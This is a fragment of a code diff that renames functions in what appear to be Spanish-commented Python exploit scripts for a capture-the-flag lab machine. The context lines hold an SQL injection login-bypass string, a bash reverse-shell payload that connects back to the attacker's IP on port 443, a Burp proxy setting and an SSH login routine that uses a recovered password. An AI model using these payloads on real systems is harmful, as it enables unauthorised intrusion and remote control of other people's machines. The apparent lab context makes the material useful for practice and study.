@@ -34,7 +34,7 @@ bypass_sqli = "username: ' or 1 -- //"
 #burp = {'http': 'http://127.0.0.1:8080'}
 lport = 443
 
-def makeRequest():
+def main():
     # Cambiar IP por la vuestra
     payload_malicious = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.75/443 0>&1'"
     payload_malicious_bytes = payload_malicious.encode('ascii')
@@ -77,7 +77,7 @@ def makeRequest():
 if __name__ == '__main__':
 
     try:
-        threading.Thread(target=makeRequest, args=()).start()
+        threading.Thread(target=main, args=()).start()
     except Exception as e:
         log.error(str(e))
 
@@ -112,7 +112,7 @@ def def_handler(sig,frame):
     sys.exit(1)
     signal.signal(signal.SIGINT, def_handler)
 
-def makeRequest():
+def main():
     p1 = log.progress("Payload")
     p1.status("Inyectando [*]")
 
@@ -127,7 +127,7 @@ def makeRequest():
 if __name__ == '__main__':
 
     try:
-        threading.Thread(target=makeRequest, args=()).start()
+        threading.Thread(target=main, args=()).start()
     except Exception as e:
         log.error(str(e))
 
@@ -163,7 +163,7 @@ def def_handler(sig, frame):
     sys.exit(1)
     signal.signal(signal.SIGINT, def_handler)
 
-def MakeRequest():
+def main():
     username = "development"
     password = ""
     #Coficacion en base64
@@ -198,8 +198,8 @@ def sshconnection(username, password):
 
 if __name__ == '__main__':
 
-    password = MakeRequest()
-    username = MakeRequest()
+    password = main()
+    username = main()
 
     try:
         threading.Thread(target=sshconnection, args=('development', password)).start()
